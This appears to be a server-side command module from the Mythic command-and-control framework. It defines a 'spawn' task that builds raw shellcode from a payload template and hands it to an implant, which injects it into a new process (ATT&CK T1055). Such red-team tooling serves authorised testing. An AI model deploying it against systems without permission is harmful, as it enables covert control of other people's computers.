from CommandBase import *
import json
from uuid import uuid4
from MythicPayloadRPC import *
from MythicFileRPC import *

class SpawnArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "template": CommandParameter(name="Payload Template (Shellcode)", type=ParameterType.Payload),
        }

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Expected JSON arguments but got command line arguments.")
        pass


class SpawnCommand(CommandBase):
    cmd = "spawn"
    needs_admin = False
    help_cmd = "spawn (modal popup)"
    description = "Spawn a new session in the executable specified by the spawnto_x86 or spawnto_x64 commands. The payload template must be shellcode."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = SpawnArguments
    attackmapping = ["T1055"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(task.args.get_arg('template'),
                                                                            description=task.operator + "'s spawned session from task " + str(task.task_id))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
                if resp.status == MythicStatus.Success:
                    if resp.build_phase == 'success':
                        if len(resp.contents) > 1 and resp.contents[:2] == b"\x4d\x5a":
                            raise Exception("spawn requires a payload of Raw output, but got an executable.")
                        # it's done, so we can register a file for it
                        task.args.add_arg("template", resp.agent_file_id)
                        break
                    elif resp.build_phase == 'error':
                        raise Exception("Failed to build new payload: {}".format(resp.error_message))
                    elif resp.build_phase == "building":
                        await asyncio.sleep(2)
                    else:
                        raise Exception(resp.build_phase)
                else:
                    raise Exception(resp.error_message)
        else:
            raise Exception("Failed to start build process")
        
        
        
        return task

    async def process_response(self, response: AgentResponse):
        pass